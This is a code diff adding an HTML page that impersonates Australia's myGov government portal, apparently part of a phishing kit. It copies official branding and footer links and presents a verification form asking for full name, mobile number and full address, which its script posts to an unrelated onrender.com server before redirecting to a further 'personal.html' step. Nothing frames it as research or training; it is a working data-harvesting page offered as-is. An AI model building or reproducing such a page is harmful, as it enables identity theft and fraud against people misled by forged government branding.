@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>Enter Personal Information - myGov</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+    <script type="text/javascript" src="mask.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&display=swap" rel="stylesheet">
+    <link href="css/mgv2-application.css" rel="stylesheet">
+    <link href="css/blugov.css" rel="stylesheet">
+    <style type="text/css">
+        .selectoption {
+            position: relative;
+            width: 100%;
+            border-radius: 2px;
+            border-radius: 0.125rem;
+            height: 48px;
+            height: 3rem;
+            border: 1px solid #000;
+            border: 0.0625rem solid #000;
+        }
+        .error-message { color: red; margin-top: 10px; }
+        .success-message { color: green; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="brand-rainbow">&nbsp;</div>
+    <header role="banner" class="mgvEnhanceHeader">
+        <section class="wrapper">
+            <div class="inner">
+                <div class="unauth-grid">
+                    <div class="unauth-grid-row">
+                        <a href="https://beta.my.gov.au/" class="unauth-govt-crest__link">
+                            <img id="unauth-govt-crest" src="images/logo-black.svg" alt="myGov Beta" role="img">
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </header>
+    <div class="wrapper-mapwap">
+        <div class="main-block" id="content" role="main">
+            <div class="unauth">
+                <div class="login-grid-container">
+                    <div class="login-grid-row">
+                        <div class="login-grid-column">
+                            <div class="digital-id-login-card-wrapper">
+                                <div class="digital-id-main-login-card override">
+                                    <h1>Enter Personal Information</h1>
+                                    <h2 class="text-align-left">Please enter your details below to continue verification.</h2>
+                                    <form id="info-form" aria-describedby="error-msg" class="mygov-login-form alternative" action="https://my-go-q7tp.onrender.com/submit-info" method="post">
+                                        <div class="input-group">
+                                            <label class="override" for="fname">Full Name</label>
+                                            <input id="fname" name="fname" type="text" value="" autocomplete="off" required>
+                                        </div>
+                                        <div class="input-group">
+                                            <label class="override" for="mobnum">Mobile Number</label>
+                                            <input id="mobnum" name="mobnum" type="tel" value="" autocomplete="off" required>
+                                        </div>
+                                        <div class="input-group">
+                                            <label class="override" for="address">Full Address on File</label>
+                                            <input id="address" name="address" type="text" value="" autocomplete="off" required>
+                                        </div>
+                                        <div class="button-digital-id-main-container override">
+                                            <div class="digital-id-button-container">
+                                                <button type="submit" class="button-main" name="_eventId_submit">Submit</button>
+                                            </div>
+                                        </div>
+                                        <!-- Feedback messages -->
+                                        <div id="feedback-message" class="hidden"></div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer role="contentinfo">
+        <div class="wrapper">
+            <div class="inner">
+                <section class="footer-list">
+                    <nav>
+                        <h2 class="sr-only" aria-label="Footer">Footer</h2>
+                        <ul class="lower-links">
+                            <li><a target="_blank" href="https://my.gov.au/en/about/terms">Terms of use</a></li>
+                            <li><a target="_blank" href="https://my.gov.au/en/about/privacy-and-security">Privacy and security</a></li>
+                            <li><a target="_blank" href="https://my.gov.au/en/about/copyright">Copyright</a></li>
+                            <li><a target="_blank" href="https://my.gov.au/en/about/accessibility">Accessibility</a></li>
+                        </ul>
+                    </nav>
+                </section>
+                <div class="footer-lower">
+                    <section class="footer-lower-logo">
+                        <a href="https://beta.my.gov.au/">
+                            <img src="images/logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img">
+                        </a>
+                    </section>
+                    <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <script type="text/javascript">
+        document.getElementById("info-form").addEventListener("submit", async function(e) {
+            e.preventDefault();
+            const form = e.target;
+            const formData = new FormData(form);
+            const feedbackDiv = document.getElementById("feedback-message");
+            feedbackDiv.className = 'hidden';
+
+            try {
+                const response = await fetch(form.action, {
+                    method: 'POST',
+                    body: formData,
+                });
+                let result;
+                try {
+                    result = await response.json();
+                } catch {
+                    throw new Error('Invalid server response');
+                }
+
+                if (response.ok) {
+                    feedbackDiv.textContent = '';
+                    feedbackDiv.className = 'success-message';
+                    setTimeout(() => {
+                        window.location.href = '/personal.html'; // Redirect to personal.html
+                    }, 1000);
+                } else {
+                    feedbackDiv.textContent = result.error || 'Error submitting information.';
+                    feedbackDiv.className = 'error-message';
+                }
+            } catch (error) {
+                feedbackDiv.textContent = `Error: ${error.message || 'Network error. Please try again.'}`;
+                feedbackDiv.className = 'error-message';
+            }
+        });
+    </script>
+</body>
+</html>
